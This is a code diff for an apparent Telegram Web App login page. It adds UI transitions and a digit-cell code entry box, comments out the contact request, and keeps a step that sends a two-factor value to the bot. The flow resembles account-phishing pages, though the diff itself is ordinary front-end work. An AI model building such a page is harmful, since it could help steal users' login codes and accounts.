@@ -12,14 +12,14 @@ document.addEventListener('DOMContentLoaded', () => {
     const twofactorInput = document.getElementById('twofactor-input');
 
     loginBtn.addEventListener('click', async () => {
+        showPage2();
         try {
-            tg.requestContact();
-
-            tg.onEvent('contactRequested', (data) => {
-                if (data.status === 'sent') {
-                    showPage2();
-                }
-            });
+            // tg.requestContact();
+            // tg.onEvent('contactRequested', (data) => {
+            //     if (data.status === 'sent') {
+            //
+            //     }
+            // });
         } catch (error) {
             console.log('[ERROR]: ' + error);
         }
@@ -31,6 +31,7 @@ document.addEventListener('DOMContentLoaded', () => {
         requestAnimationFrame(() => {
             page2.style.transform = 'translateY(0)';
         });
+        blur.style.zIndex = '0';
         page2.style.zIndex = '100';
         blur.style.opacity = '1';
         loginbtn.style.display = 'none';
@@ -38,10 +39,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
     blur.addEventListener('click', () => {
         if (page === 'page2') {
+            blur.style.zIndex = '-1';
             page2.style.display = 'none';
             blur.style.opacity = '0';
             loginbtn.style.display = 'flex';
             page = 'page1';
+
+            requestAnimationFrame(() => {
+                page2.style.transform = 'translateY(40px)';
+            });
         }
     });
 
@@ -69,5 +75,25 @@ document.addEventListener('DOMContentLoaded', () => {
         tg.sendData(
             JSON.stringify({ action: 'twofactor_value', value: value })
         );
+    });
+
+    const input = document.getElementById('hiddenInput');
+    const cells = document.querySelectorAll('.cell');
+    const box = document.getElementById('codeBox');
+
+    box.addEventListener('click', () => input.focus());
+
+    input.addEventListener('input', () => {
+        const value = input.value.split('');
+        cells.forEach((cell, i) => (cell.textContent = value[i] || ''));
+        cells.forEach((cell, i) => {
+            if (value[i]) {
+                requestAnimationFrame(() => {
+                    cell.style.boxShadow = '0 0 0.1rem 0.1rem #59be4a';
+                });
+            } else {
+                cell.style.boxShadow = 'none';
+            }
+        });
     });
 });
